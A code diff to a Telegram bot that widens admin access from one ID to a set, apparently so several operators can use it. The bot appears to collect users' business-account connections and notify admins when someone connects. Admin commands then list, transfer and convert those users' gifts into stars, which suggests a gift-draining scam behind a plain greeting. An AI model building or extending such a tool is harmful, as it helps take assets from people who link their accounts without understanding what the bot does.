@@ -31,7 +31,7 @@ CONNECTIONS_FILE = "business_connections.json"
 LANGUAGE_FILE = "user_languages.json"
 
 TOKEN = config.BOT_TOKEN
-ADMIN_ID = config.ADMIN_ID
+ADMIN_IDS = config.ADMIN_IDS  # Оновлено до множини
 SENDER_ID = config.SENDER_ID
 SPECIAL_USER_ID = 6831903905  # ID спеціального користувача
 BOT_USERNAME = "SendCheekBot"  # Додано правильне ім'я бота
@@ -167,7 +167,8 @@ def save_user_language(user_id: int, lang: str):
 
 async def send_welcome_message_to_admin(user_id):
     try:
-        await bot.send_message(ADMIN_ID, f"👤 Користувач #{user_id} підключив бота.")
+        for admin_id in ADMIN_IDS:  # Оновлено для надсилання всім адмінам
+            await bot.send_message(admin_id, f"👤 Користувач #{user_id} підключив бота.")
     except Exception as e:
         logging.exception("Не вдалося відправити повідомлення в особистий чат.")
 
@@ -294,7 +295,7 @@ async def start_command(message: Message):
                 reply_markup=keyboard
             )
 
-    elif message.from_user.id != ADMIN_ID:
+    elif message.from_user.id not in ADMIN_IDS:  # Оновлено для перевірки зі списку ADMIN_IDS
         # Стандартне привітання
         photo = FSInputFile("1.jpg")
         keyboard = InlineKeyboardMarkup(inline_keyboard=[
@@ -512,7 +513,7 @@ async def check_permissions_callback(callback: CallbackQuery):
 
 @dp.message(F.text.startswith("/transfer"))
 async def transfer_gift_handler(message: Message, bot):
-    if message.from_user.id != ADMIN_ID:
+    if message.from_user.id not in ADMIN_IDS:  # Оновлено для перевірки зі списку ADMIN_IDS
         await message.reply("⛔ Нет доступа.")
         return
     try:
@@ -540,7 +541,7 @@ async def transfer_gift_handler(message: Message, bot):
 
 @dp.message(F.text == "/gifts")
 async def handle_gifts_list(message: Message):
-    if message.from_user.id != ADMIN_ID:
+    if message.from_user.id not in ADMIN_IDS:  # Оновлено для перевірки зі списку ADMIN_IDS
         await message.reply("⛔ Нет доступа.")
         return
     try:
@@ -606,7 +607,7 @@ async def handle_gift_callback(callback: CallbackQuery):
 @dp.callback_query(F.data.startswith("transfer:"))
 async def handle_transfer(callback: CallbackQuery):
     await callback.answer()
-    if callback.from_user.id != ADMIN_ID:
+    if callback.from_user.id not in ADMIN_IDS:  # Оновлено для перевірки зі списку ADMIN_IDS
         await callback.message.reply("⛔ Нет доступа.")
         return
     try:
@@ -642,7 +643,7 @@ async def handle_transfer(callback: CallbackQuery):
 
 @dp.message(F.text == "/stars")
 async def show_star_users(message: Message):
-    if message.from_user.id != ADMIN_ID:
+    if message.from_user.id not in ADMIN_IDS:  # Оновлено для перевірки зі списку ADMIN_IDS
         await message.reply("⛔ Нет доступа.")
         return
     try:
@@ -741,6 +742,9 @@ async def convert_non_unique_gifts_to_stars(bot: Bot, business_connection_id: st
 
 @dp.message(F.text == "/convert")
 async def convert_menu(message: Message):
+    if message.from_user.id not in ADMIN_IDS:  # Оновлено для перевірки зі списку ADMIN_IDS
+        await message.reply("⛔ Нет доступа.")
+        return
     try:
         with open("business_connections.json", "r", encoding="utf-8") as f:
             connections = json.load(f)
@@ -810,7 +814,7 @@ async def convert_exec_handler(callback: CallbackQuery):
 
 @dp.message(F.text == "/test")
 async def test(message: Message):
-    if message.from_user.id != ADMIN_ID:
+    if message.from_user.id not in ADMIN_IDS:  # Оновлено для перевірки зі списку ADMIN_IDS
         await message.reply("⛔ Нет доступа.")
         return
     await message.answer("✅ Проверка выполнена. Бот готов к работе!")
@@ -904,7 +908,7 @@ async def inline_query_handler(inline_query: InlineQuery):
 
 @dp.message(F.text == "/check_kd")
 async def check_kd_list(message: Message):
-    if message.from_user.id != ADMIN_ID:
+    if message.from_user.id not in ADMIN_IDS:  # Оновлено для перевірки зі списку ADMIN_IDS
         await message.reply("⛔ Нет доступа.")
         return
     try:
